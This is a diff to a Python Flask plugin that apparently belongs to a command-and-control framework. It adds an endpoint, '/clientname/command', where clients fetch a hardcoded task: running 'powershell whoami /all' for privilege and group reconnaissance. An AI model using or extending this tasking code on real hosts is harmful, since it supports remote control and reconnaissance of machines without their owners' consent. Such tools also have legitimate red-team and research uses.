@@ -25,7 +25,7 @@ from time import sleep
 #from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity, exceptions
 #from flask import Flask, jsonify, request, send_from_directory, render_template, Response
 
-from flask import Flask, send_from_directory, request, make_response
+from flask import Flask, send_from_directory, request, make_response, jsonify
 import threading
 import requests
 import os
@@ -121,9 +121,10 @@ class ExternalPluginClass(ExternalBasePlugin, BaseLogging):
 
     def register_routes(self):
         self.logger.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]}")
-        self.app.route(f'/', methods = ["GET"])(self.plugin_function)
+        #self.app.route(f'/', methods = ["GET"])(self.plugin_function)
         #self.app.route(f'/<path:filename>', methods = ["GET"])(self.serve_file)
         self.app.route(f'/command', methods = ["POST"])(self.endpoint_get_command)
+        self.app.route(f'/clientname/command', methods = ["GET"])(self.client_get_command)
 
     def get_command_loop(self):
         command = super().get_command()
@@ -136,6 +137,17 @@ class ExternalPluginClass(ExternalBasePlugin, BaseLogging):
         An endpont that gets the JSON from the server for commands for clients
         
         '''
+
+    def client_get_command(self):
+        '''
+        For clients to get commands
+        
+        '''
+        command = {
+            "command":['powershell', 'whoami /all']
+        }
+
+        return jsonify(command)
 
 if __name__ == "__main__":
     app = Flask(__name__)
